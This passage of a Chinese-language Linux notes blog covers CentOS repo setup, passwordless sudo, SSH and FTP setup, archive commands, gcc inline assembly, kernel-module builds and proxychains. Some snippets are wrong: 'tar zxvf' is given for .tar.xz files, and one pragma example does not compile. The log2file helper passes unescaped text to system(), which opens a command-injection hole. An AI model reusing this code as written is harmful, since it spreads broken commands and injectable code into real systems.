Number) - Base</span><br><span class="line">baseurl=http://vault.centos.org/(Your Version Number)/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-5</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[C(Your Version Number-updates]</span><br><span class="line">name=CentOS-(Your Version Number) - Updates</span><br><span class="line">baseurl=http://vault.centos.org/(Your Version Number)/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-5</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">[C7.4.1708-base]</span><br><span class="line">name=CentOS-7.4.1708 - Base</span><br><span class="line">baseurl=https://vault.centos.org/7.4.1708/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[C7.4.1708-updates]</span><br><span class="line">name=CentOS-7.4.1708 - Updates</span><br><span class="line">baseurl=https://vault.centos.org/7.4.1708/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure></li></ol><p>之后再试一次install即可.</p><p>更多参考<a href="http://wiki.r1soft.com/display/kb3/Finding+Old+kernel-devel+Packages+For+CentOS">Finding Old kernel-devel Packages For CentOS</a></p><h2 id="添加sudoer-并且取消密码"><a href="#添加sudoer-并且取消密码" class="headerlink" title="添加sudoer 并且取消密码"></a>添加sudoer 并且取消密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">superuser ALL=(ALL) NOPASSWD:ALL</span><br><span class="line">superuser ALL=(ALL:ALL) ALL　<span class="comment">#不取消密码</span></span><br></pre></td></tr></table></figure><h2 id="创建ssh服务"><a href="#创建ssh服务" class="headerlink" title="创建ssh服务"></a>创建ssh服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y install openssh-server openssh-clients</span><br><span class="line">$ chkconfig sshd on</span><br><span class="line">$ service sshd start</span><br><span class="line">$ netstat -tulpn | grep :22</span><br><span class="line">$ vi /etc/sysconfig/iptables -A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="创建ftp-服务"><a href="#创建ftp-服务" class="headerlink" title="创建ftp 服务"></a>创建ftp 服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install vsftpd</span><br><span class="line">sudo service vsftpd restart</span><br><span class="line">chkconfig vsftpd on</span><br></pre></td></tr></table></figure><h2 id="ubuntu修改内核调试启动项"><a href="#ubuntu修改内核调试启动项" class="headerlink" title="ubuntu修改内核调试启动项"></a>ubuntu修改内核调试启动项</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/default/grub</span><br></pre></td></tr></table></figure><p>在屁股后面添加 kgdboc&#x3D;ttyS1,115200</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep menu /boot/grub/grub.cfg</span><br><span class="line">grub-reboot ‘1&gt;3’ </span><br></pre></td></tr></table></figure><p>第一个数字1代表第二行的submenu，第二个3代表submenu的第四个（从0开始）</p><h2 id="挂起一个进程"><a href="#挂起一个进程" class="headerlink" title="挂起一个进程"></a>挂起一个进程</h2><p>ctrl+z<br>fg 恢复</p><h2 id="打包、解压文件"><a href="#打包、解压文件" class="headerlink" title="打包、解压文件"></a>打包、解压文件</h2><p>解包使用x,打包使用c</p><p>tar.xz<br>解包:tar zxvf file.tar.xz 或者:xz -d file.tar.xz &amp;&amp; tar xvf file.tar<br>打包:tar zcvf file.tar.xz</p><p>.tar<br>解包：tar xvf FileName.tar<br>打包：tar cvf FileName.tar DirName<br>（注：tar是打包，不是压缩！）<br>———————————————<br>.gz<br>解压1：gunzip FileName.gz<br>解压2：gzip -d FileName.gz<br>压缩：gzip FileName</p><p>.tar.gz 和 .tgz<br>解压：tar zxvf FileName.tar.gz<br>压缩：tar zcvf FileName.tar.gz DirName<br>———————————————<br>.bz2<br>解压1：bzip2 -d FileName.bz2<br>解压2：bunzip2 FileName.bz2<br>压缩： bzip2 -z FileName</p><p>.tar.bz2<br>解压：tar jxvf FileName.tar.bz2<br>压缩：tar jcvf FileName.tar.bz2 DirName<br>———————————————<br>.bz<br>解压1：bzip2 -d FileName.bz<br>解压2：bunzip2 FileName.bz<br>压缩：未知</p><p>.tar.bz<br>解压：tar jxvf FileName.tar.bz<br>压缩：未知<br>———————————————<br>.Z<br>解压：uncompress FileName.Z<br>压缩：compress FileName<br>.tar.Z</p><p>解压：tar Zxvf FileName.tar.Z<br>压缩：tar Zcvf FileName.tar.Z DirName<br>———————————————<br>.zip<br>解压：unzip FileName.zip<br>压缩：zip FileName.zip DirName<br>———————————————<br>.rar<br>解压：rar x FileName.rar<br>压缩：rar a FileName.rar DirName<br>———————————————<br>.lha<br>解压：lha -e FileName.lha<br>压缩：lha -a FileName.lha FileName<br>———————————————<br>.rpm<br>解包：rpm2cpio FileName.rpm | cpio -div<br>———————————————<br>.deb<br>解包：ar p FileName.deb data.tar.gz | tar zxf -<br>———————————————<br>.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea<br>解压：sEx x FileName.*<br>压缩：sEx a FileName.* FileName</p><h2 id="单独重新编译一个内核模块"><a href="#单独重新编译一个内核模块" class="headerlink" title="单独重新编译一个内核模块"></a>单独重新编译一个内核模块</h2><p>当我们想修改内核某个模块,又不想重新make all的时候,可以这样操作.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make drivers/net/ethernet/intel/e1000/e1000.ko</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make drivers/net/ethernet/intel/e1000/</span><br></pre></td></tr></table></figure><h2 id="gcc-汇编"><a href="#gcc-汇编" class="headerlink" title="gcc 汇编"></a>gcc 汇编</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix # intel 汇编格式</span><br><span class="line">xor eax, eax</span><br><span class="line"></span><br><span class="line">.att_syntax prefix # att汇编格式</span><br><span class="line">movl %adx, %eax…</span><br></pre></td></tr></table></figure><p>一个简单的 t.s 文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global  test # 声明函数</span><br><span class="line">.global g_var # 声明全局变量</span><br><span class="line"></span><br><span class="line">.text # 以下是.text段</span><br><span class="line">test:</span><br><span class="line">    mov qword ptr[g_var], 12</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">.data # 以下是.data段</span><br><span class="line">g_var: .quad 0 # 初始化变量为 0</span><br></pre></td></tr></table></figure><p>t.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">long</span> g_var;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, g_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是<code>t.cpp</code>, 记得使用<code>extern &quot;C&quot; int test(void);</code></p><p>编译链接:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c t.s</span><br><span class="line">gcc t.c t.o -o tt2</span><br></pre></td></tr></table></figure><p>如果是编写so文件, 记得在Makefile的命令中添加<code>-fstack-protector-all</code>, 否则, 会有个<code>execute stack</code>的flag在里面, 导致dlopen失败.</p><p>更多参考<a href="https://renenyffenegger.ch/notes/development/languages/C-C-plus-plus/GCC/as/index">GNU assembler</a>, <a href="https://stackoverflow.com/questions/7190050/how-do-i-compile-the-asm-generated-by-gcc">How do I compile the asm generated by GCC?</a>, <a href="https://cs.lmu.edu/~ray/notes/gasexamples/">GNU Assembler Examples</a></p><h2 id="编写linux驱动与汇编相关的tips"><a href="#编写linux驱动与汇编相关的tips" class="headerlink" title="编写linux驱动与汇编相关的tips"></a>编写linux驱动与汇编相关的tips</h2><p>如果想给驱动内联一个汇编文件的函数, 可以如下:</p><p><strong>Makefile</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m += Anyname.o</span><br><span class="line">KDIR:=/lib/modules/$(shell uname -r)/build</span><br><span class="line">MAKE:=make</span><br><span class="line">Anyname-objs := main.o test.o</span><br><span class="line">CFLAGS_main.o := -D_FORTIFY_SOURCE=<span class="number">0</span> -O0</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules  </span><br><span class="line">clean:  </span><br><span class="line">$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) clean</span><br></pre></td></tr></table></figure><p><strong>main.c</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span> </span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">test2</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_module_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  printk(<span class="string">&quot;module init done\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;test:%d, %d\n&quot;</span>, test(), test2());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_module_exit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  printk(<span class="string">&quot;module exit\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init( my_module_init );<span class="comment">//声明初始化函数</span></span><br><span class="line">module_exit( my_module_exit );</span><br></pre></td></tr></table></figure><p><strong>test.S</strong>: 这里后缀必须是大写的<strong>S</strong>, 额外的格式参考<a href="https://github.com/torvalds/linux/blob/177366bf7ceb35860281a6ebe824e42bf96fd95d/arch/x86/net/bpf_jit.S">arch&#x2F;x86&#x2F;net&#x2F;bpf_jit.S</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix #声明 intel 格式</span><br><span class="line">.text # 声明 .text 字段</span><br><span class="line">.global test # 声明函数</span><br><span class="line">test:</span><br><span class="line">mov rax,12</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.global test2 # 声明函数</span><br><span class="line">test2:</span><br><span class="line">mov rax, 8</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>如果想禁止gcc编译的驱动给某个函数优化, 可以使用<code>void __attribute__((optimize(&quot;O0&quot;)))  test(void)</code>, 这样这个函数就不会被优化了.</p><p>也可以采取如下方式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#pragma GCC push_options</span><br><span class="line">#pragma GCC optimize(&quot;O0&quot;)</span><br><span class="line">void test(void)&#123;</span><br><span class="line">  int i=0;</span><br><span class="line">  return i+1;</span><br><span class="line">&#125;</span><br><span class="line">#pragma GCC pop_options</span><br></pre></td></tr></table></figure><p><strong>额外的tips, 如果存在<code>if(var&amp;0x80000000)</code>这样的操作, var一定不要用<code>int</code>类型, 要用无符号! gcc会把判断直接优化成0!!!!!!!!</strong></p><h2 id="gcc-内联汇编语法示例"><a href="#gcc-内联汇编语法示例" class="headerlink" title="gcc 内联汇编语法示例"></a>gcc 内联汇编语法示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> __asm__ (&quot;movl %eax, %ebx\n\t&quot;</span><br><span class="line">          &quot;movq %%rax,%%rdx\n\t&quot; // 64bit operation</span><br><span class="line">          &quot;movl %ecx, $label(%edx,%ebx,$4)\n\t&quot;</span><br><span class="line">          &quot;movb %ah, (%ebx)&quot;);</span><br><span class="line">asm ( assembler template </span><br><span class="line">          : output operands                  /* optional */</span><br><span class="line">          : input operands                   /* optional */</span><br><span class="line">          : list of clobbered registers      /* optional */</span><br><span class="line">          );</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int a=10, b;</span><br><span class="line">asm (&quot;movl %1, %%eax; </span><br><span class="line">      movl %%eax, %0;&quot;</span><br><span class="line">     :&quot;=r&quot;(b)        /* output */</span><br><span class="line">     :&quot;r&quot;(a)         /* input */</span><br><span class="line">     :&quot;%eax&quot;         /* clobbered register */</span><br><span class="line">     );   </span><br></pre></td></tr></table></figure><p><strong>“&#x3D;r”(b)</strong> 的含义, 将输出放入倒变量b里(%0 代表第一个变量, 此处第一个变量是输出里的b, 所以%0就是b, %1是 a). r代表使用任意寄存器, 如果是其它寄存器, 参考如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+---+--------------------+</span><br><span class="line">| r |    Register(s)     |</span><br><span class="line">+---+--------------------+</span><br><span class="line">| a |   %eax, %ax, %al   |</span><br><span class="line">| b |   %ebx, %bx, %bl   |</span><br><span class="line">| c |   %ecx, %cx, %cl   |</span><br><span class="line">| d |   %edx, %dx, %dl   |</span><br><span class="line">| S |   %esi, %si        |</span><br><span class="line">| D |   %edi, %di        |</span><br><span class="line">+---+--------------------+</span><br></pre></td></tr></table></figure><p>如果是使用内存, 用 <strong>m</strong>.</p><p>其它指示标识:</p><blockquote><ol><li>“m” : A memory operand is allowed, with any kind of address that the machine supports in general.</li><li>“o” : A memory operand is allowed, but only if the address is offsettable. ie, adding a small offset to the address gives a valid address.</li><li>“V” : A memory operand that is not offsettable. In other words, anything that would fit the <code>m’ constraint but not the </code>o’constraint.</li><li>“i” : An immediate integer operand (one with constant value) is allowed. This includes symbolic constants whose values will be known only at assembly time.</li><li>“n” : An immediate integer operand with a known numeric value is allowed. Many systems cannot support assembly-time constants for operands less than a word wide. Constraints for these operands should use ’n’ rather than ’i’.</li><li>“g” : Any register, memory or immediate integer operand is allowed, except for registers that are not general registers.</li></ol></blockquote><p>x86指令独有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. &quot;r&quot; : Register operand constraint, look table given above.</span><br><span class="line">2. &quot;q&quot; : Registers a, b, c or d.</span><br><span class="line">3. &quot;I&quot; : Constant in range 0 to 31 (for 32-bit shifts).</span><br><span class="line">4. &quot;J&quot; : Constant in range 0 to 63 (for 64-bit shifts).</span><br><span class="line">5. &quot;K&quot; : 0xff.</span><br><span class="line">6. &quot;L&quot; : 0xffff.</span><br><span class="line">7. &quot;M&quot; : 0, 1, 2, or 3 (shifts for lea instruction).</span><br><span class="line">8. &quot;N&quot; : Constant in range 0 to 255 (for out instruction).</span><br><span class="line">9. &quot;f&quot; : Floating point register</span><br><span class="line">10. &quot;t&quot; : First (top of stack) floating point register</span><br><span class="line">11. &quot;u&quot; : Second floating point register</span><br><span class="line">12. &quot;A&quot; : Specifies the `a’ or `d’ registers. This is primarily useful for 64-bit integer values intended to be returned with the `d’ register holding the most significant bits and the `a’ register holding the least significant bits.</span><br></pre></td></tr></table></figure><p>特殊符合含义:</p><ol><li>“<strong>&#x3D;</strong>“ : 将结果写入到指定位置</li><li>“<strong>&amp;</strong>“ : Means that this operand is an earlyclobber operand, which is modified before the instruction is finished using the input operands. Therefore, this operand may not lie in a register that is used as an input operand or as part of any memory address. An input operand can be tied to an earlyclobber operand if its only use as an input occurs before the early result is written.</li></ol><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static inline char * strcpy(char * dest,const char *src)</span><br><span class="line">&#123;</span><br><span class="line">int d0, d1, d2;</span><br><span class="line">__asm__ __volatile__(  &quot;1:\tlodsb\n\t&quot;</span><br><span class="line">                       &quot;stosb\n\t&quot;</span><br><span class="line">                       &quot;testb %%al,%%al\n\t&quot;</span><br><span class="line">                       &quot;jne 1b&quot;</span><br><span class="line">                     : &quot;=&amp;S&quot; (d0), &quot;=&amp;D&quot; (d1), &quot;=&amp;a&quot; (d2)</span><br><span class="line">                     : &quot;0&quot; (src),&quot;1&quot; (dest) </span><br><span class="line">                     : &quot;memory&quot;);</span><br><span class="line">return dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们不希望编译器优化掉我们的某些特殊循环判断时:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asm (&quot;l1:\tmovb (%0), %%al\n\t&quot;</span><br><span class="line">  &quot;cmp $0xcc, %%al\n\t&quot;</span><br><span class="line">  &quot;je l1&quot;</span><br><span class="line">  ::&quot;r&quot;(&amp;buffer[0x7f]));</span><br></pre></td></tr></table></figure><h2 id="禁用gcc的某个函数优化"><a href="#禁用gcc的某个函数优化" class="headerlink" title="禁用gcc的某个函数优化"></a>禁用gcc的某个函数优化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#pragma GCC push_options</span><br><span class="line">#pragma GCC optimize(&quot;O0&quot;)</span><br><span class="line">void test(int a);</span><br><span class="line">  return a;</span><br><span class="line">&#125;</span><br><span class="line">#pragma GCC pop_options</span><br></pre></td></tr></table></figure><p>更多参考<a href="http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">GCC-Inline-Assembly-HOWTO</a></p><h2 id="log至文件中"><a href="#log至文件中" class="headerlink" title="log至文件中"></a>log至文件中</h2><p>有时候看不到printf, 需要log到文件里, 就经常需要查阅怎么写, 比较烦人. 记录一下.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sl</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*str++)&#123;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">log2file</span><span class="params">(<span class="type">char</span> *fmt, ...)</span>&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x200</span>];</span><br><span class="line">    <span class="comment">// 请自己确保log的内容不超过0x200.</span></span><br><span class="line">    <span class="built_in">vsprintf</span>(str, fmt, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    fd = open(<span class="string">&quot;/tmp/mylog.log&quot;</span>, O_CREAT|O_WRONLY|O_APPEND, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create fail\n&quot;</span>);</span><br><span class="line">        fd = open(<span class="string">&quot;/tmp/mylog.log&quot;</span>, O_WRONLY|O_APPEND, <span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">if</span>(fd==<span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="type">char</span> str2[<span class="number">0x200</span>];</span><br><span class="line">            <span class="built_in">sprintf</span>(str2, <span class="string">&quot;echo \&quot;%s\&quot;&gt; /tmp/mylog.log&quot;</span>, str);</span><br><span class="line">            system(str2);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write\n&quot;</span>);</span><br><span class="line">    write(fd, str, sl(str));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    log2file(<span class="string">&quot;hello:%x\n&quot;</span>, <span class="number">0x111231</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="centos7-代理yum"><a href="#centos7-代理yum" class="headerlink" title="centos7 代理yum"></a>centos7 代理yum</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line">rpm -ivh https://mirrors.aliyun.com/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">yum install -y proxychains-ng</span><br></pre></td></tr></table></figure><p>修改配置<code>vi /etc/proxychains.conf</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">socks5  192.168.150.1 7890</span><br></pre></td></tr></table></figure><p>代理yum</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&gt; proxychains4 yum install bpftrace</span><br></pre></td></tr></table></figure><h2 id="Centos6-国内源"><a href="#Centos6-国内源" class="headerlink" title="Centos6 国内源"></a>Centos6 国内源</h2><p>因为centos6.x停止维护了, 所以要找个能用的源很麻烦, 偶尔要设置又容易忘了, 在此记录一下</p><ol><li><p>下载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-6.10.repo</span><br></pre></td></tr></table></figure></li><li><p>编辑<code>/etc/yum.repos.d/CentOS-Base.repo</code>, 在vim里更改版本 <code>:%s/6.10/6.8/g</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"># CentOS-Base.repo</span><br><span class="line"></span><br><span class="line">[base]</span><br><span class="line">name=CentOS-vault-6.10 - 